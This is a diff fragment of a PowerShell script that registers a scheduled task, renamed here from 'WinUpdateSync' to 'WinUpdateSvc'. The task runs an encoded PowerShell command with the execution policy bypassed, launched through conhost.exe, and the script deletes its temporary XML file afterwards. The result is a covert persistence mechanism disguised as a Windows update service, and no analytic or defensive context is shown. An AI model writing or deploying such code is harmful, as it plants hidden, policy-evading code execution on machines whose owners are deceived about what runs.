@@ -40,15 +40,13 @@ $xml = "<?xml version='1.0' encoding='UTF-16'?>
   <Actions Context='Author'>
     <Exec>
       <Command>conhost.exe</Command>
-      <Arguments>--headless powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand $enc_task</Arguments>
+      <Arguments>powershell.exe -NoExit -ExecutionPolicy Bypass -EncodedCommand $enc_task</Arguments>
     </Exec>
   </Actions>
 </Task>"
 
 $xml | Out-File "$env:TEMP\t.xml" -Encoding Unicode
-# Delete old one first just to be safe
-schtasks /Delete /TN "WinUpdateSync" /F 2>$null
-schtasks /Create /XML "$env:TEMP\t.xml" /TN "WinUpdateSync" /F
+schtasks /Create /XML "$env:TEMP\t.xml" /TN "WinUpdateSvc" /F
 Remove-Item "$env:TEMP\t.xml" -Force
 
 
